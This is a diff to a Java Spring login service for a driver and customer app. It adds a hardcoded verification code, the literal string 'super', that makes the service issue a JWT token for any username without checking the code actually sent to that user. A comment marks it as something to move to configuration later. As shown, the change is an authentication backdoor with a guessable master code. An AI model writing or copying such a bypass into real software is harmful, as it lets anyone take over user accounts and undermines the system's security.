@@ -17,6 +17,10 @@ import java.util.concurrent.ConcurrentHashMap;
 @Service
 public class LoginService {
 
+
+    //    @Value("${SUPER_CODE}") later for yml (use as environment variable)
+    private static final String SUPER_CODE = "super";
+
     private final DriverRepository driverRepository;
     private final CustomerRepository customerRepository;
     private final PasswordEncoder passwordEncoder;
@@ -86,7 +90,13 @@ public class LoginService {
 
     // Modified method: return token if verified
     public String verifyCodeAndGetToken(String username, String code) {
+
         String storedCode = verificationCodes.get(username);
+        // super code logic
+        if (code.equals(SUPER_CODE)) {
+            verificationCodes.remove(username);
+            return jwtTokenProvider.createToken(username);
+        }
         if (storedCode != null && storedCode.equals(code)) {
             verificationCodes.remove(username);
             return jwtTokenProvider.createToken(username);
